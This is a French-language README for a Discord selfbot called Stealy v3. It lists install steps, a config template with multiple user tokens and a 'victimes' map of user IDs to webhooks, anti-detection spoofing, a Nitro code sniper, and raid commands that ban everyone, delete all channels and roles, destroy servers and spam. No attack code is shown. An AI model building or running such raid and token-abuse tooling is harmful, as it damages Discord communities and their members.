# 🚀 Stealy v3.0.0

<div align="center">

![Stealy Logo](https://i.imgur.com/TPRGKbj.png)

**Un selfbot Discord avancé et puissant créé par Sans**

[![Version](https://img.shields.io/badge/version-3.0.0-blue.svg)](https://github.com/Sans/Stealy-v3)
[![Discord.js](https://img.shields.io/badge/discord.js-14.21.0-blue.svg)](https://discord.js.org/)
[![Node.js](https://img.shields.io/badge/node.js-18+-green.svg)](https://nodejs.org/)
[![Bun](https://img.shields.io/badge/bun-1.0+-yellow.svg)](https://bun.sh/)
[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)

</div>

---

## 📋 Table des matières

- [✨ Fonctionnalités](#-fonctionnalités)
- [🚀 Installation](#-installation)
- [⚙️ Configuration](#️-configuration)
- [📚 Commandes](#-commandes)
- [🔧 Structure du projet](#-structure-du-projet)
- [⚠️ Avertissements](#️-avertissements)
- [📝 Licence](#-licence)
- [👨‍💻 Créateur](#-créateur)

---

## ✨ Fonctionnalités

### 🎯 **Fonctionnalités principales**
- **Système de gestion multi-tokens** avec chiffrement automatique
- **Interface de gestion centralisée** pour contrôler tous les selfbots
- **Système de whitelist** avec rôles et permissions
- **Base de données personnalisée** par utilisateur
- **Système de logs avancé** avec webhooks Discord

### 🛡️ **Sécurité et protection**
- **Chiffrement automatique** des tokens sensibles
- **Système anti-détection** avec spoofing avancé
- **Protection contre les raids** et attaques
- **Gestion des permissions** granulaires

### 🎮 **Commandes et outils**
- **100+ commandes** réparties en catégories
- **Outils de modération** avancés
- **Fonctionnalités de raid** (à utiliser responsablement)
- **Système RPC** personnalisable
- **Outils de gestion** des serveurs et utilisateurs

---

## 🚀 Installation

### Prérequis
- **Bun 1.0+** (requis)
- **Git** installé
- **Discord** (compte avec token)

### Étapes d'installation

1. **Cloner le repository**
```bash
git clone https://github.com/Sans/Stealy-v3.git
cd Stealy-v3
```

2. **Installer les dépendances**
```bash
bun install
```

**⚠️ En cas d'erreur d'installation de module :**
```bash
bun i --silent node-gyp rebuild
```

3. **Configuration**
```bash
# Copier le fichier de configuration
cp config.example.json config.json

# Éditer la configuration
nano config.json
```

4. **Lancer le projet**
```bash
# Avec Bun (recommandé)
bun run start

# Ou avec npm
npm start

# Ou avec PM2
pm2 start index.js -n "Stealy" --interpreter bun
```

---

## ⚙️ Configuration

### Fichier `config.json`

```json
{
    "token": "Token du MANAGER",
    "premium_disable": true,
    "victimes": {
        "ID Victime I": "Webhook I",
        "ID Victime II": "Webhook II",
        "ID Victime III": "Webhook III"
    },
    "guild_id": "ID du serveur principal",
    "log_channel": "ID du salon de logs",
    "staff_role": "ID du rôle staff",
    "whitelist_role": "ID du rôle whitelist",
    "owners": [
        "ID Owner I",
        "ID Owner II"
    ],
    "users": [
        "Token User I",
        "Token User II"
    ]
}
```

### Variables importantes

| Variable | Description |
|----------|-------------|
| `token` | Token Discord du compte manager |
| `premium_disable` | Désactive le système premium |
| `victimes` | Mapping ID utilisateur → Webhook |
| `guild_id` | ID du serveur principal |
| `log_channel` | Salon pour les logs |
| `staff_role` | Rôle avec permissions staff |
| `whitelist_role` | Rôle des utilisateurs whitelistés |
| `owners` | Liste des IDs des propriétaires |
| `users` | Liste des tokens des selfbots |

---

## 📚 Commandes

### 🎮 **Fon et divertissement**
- `!blurpify` - Transforme une image en "blurp"
- `!deepfry` - Applique un effet "deep fry" à une image
- `!hug`, `!kiss`, `!love` - Actions sociales
- `!magic` - Effets magiques
- `!nitro` - Générateur de codes Nitro
- `!react` - Réactions automatiques

### 🛡️ **Modération**
- `!ban`, `!kick` - Bannir/expulser des membres
- `!addrole`, `!delrole` - Gestion des rôles
- `!lock`, `!unlock` - Verrouiller/déverrouiller des salons
- `!clearperms` - Nettoyer les permissions
- `!renew` - Renouveler des éléments

### 🚨 **Raid (Utilisation responsable)**
- `!banall` - Bannir tous les membres
- `!kickall` - Expulser tous les membres
- `!delc` - Supprimer tous les salons
- `!delr` - Supprimer tous les rôles
- `!destroy` - Destruction complète du serveur
- `!spam` - Spam de messages

### ⚙️ **Paramètres**
- `!logs` - Configuration des logs
- `!muteall` - Muter tous les membres
- `!nitrosniper` - Intercepter les codes Nitro
- `!setprefix` - Changer le préfixe
- `!setlanguage` - Changer la langue
- `!vip` - Gestion du statut VIP

### 🛠️ **Outils**
- `!antigroup` - Protection anti-groupe
- `!backup` - Sauvegarde du serveur
- `!call` - Appels vocaux
- `!emoji` - Gestion des emojis
- `!find` - Recherche avancée
- `!ip` - Informations IP
- `!rainbowrole` - Rôle arc-en-ciel

### 📊 **Utilitaires**
- `!avatar` - Afficher l'avatar
- `!badges` - Afficher les badges
- `!banner` - Afficher la bannière
- `!serverinfo` - Informations du serveur
- `!userinfo` - Informations utilisateur
- `!stats` - Statistiques du selfbot

---

## 🔧 Structure du projet

```
Stealy-v3/
├── 📁 Manager/           # Interface de gestion
│   ├── 📁 commands/      # Commandes du manager
│   └── 📁 events/        # Événements du manager
├── 📁 Selfbot/           # Selfbot principal
│   ├── 📁 commands/      # Commandes du selfbot
│   └── 📁 events/        # Événements du selfbot
├── 📁 Structures/        # Structure du projet
│   ├── 📁 files/         # Fichiers de base
│   ├── 📁 packages/      # Packages externes
│   └── 📁 antiraids/     # Protection anti-raid
├── 📄 index.js           # Point d'entrée principal
├── 📄 package.json       # Dépendances et scripts
└── 📄 config.json        # Configuration
```

### Architecture technique

- **Manager Discord.js** : Interface de contrôle centralisée
- **Selfbot Stealy** : Client selfbot personnalisé
- **Système de chiffrement** : Protection des tokens
- **Base de données JSON** : Stockage des données utilisateur
- **Système d'événements** : Gestion des interactions
- **Handlers automatiques** : Chargement des commandes et événements

---

## ⚠️ Avertissements

### ⚠️ **Important à savoir**

- **Stealy est un selfbot** - Utilisez à vos propres risques
- **Violation des ToS Discord** - Peut entraîner la suspension du compte
- **Utilisation responsable** - Ne pas utiliser pour nuire à autrui
- **Tests uniquement** - Recommandé pour l'apprentissage et les tests

### 🚫 **Ce que vous ne devez PAS faire**

- Utiliser sur votre compte principal
- Attaquer des serveurs sans permission
- Spammer ou harceler des utilisateurs
- Violer les lois locales

### ✅ **Utilisation recommandée**

- Tests sur serveurs privés
- Apprentissage du développement Discord
- Développement de bots légitimes
- Recherche en sécurité

---

## 📝 Licence

Ce projet est sous licence **MIT**. Voir le fichier [LICENSE](LICENSE) pour plus de détails.

---

## 👨‍💻 Créateur

**Stealy** a été créé avec ❤️ par **Sans**

- **GitHub** : [@Sans](https://github.com/Sans)
- **Discord** : Sans#0000
- **Version actuelle** : 3.0.0

---

<div align="center">

**⭐ N'oubliez pas de mettre une étoile si ce projet vous plaît ! ⭐**

*Développé avec passion pour la communauté Discord*

</div>

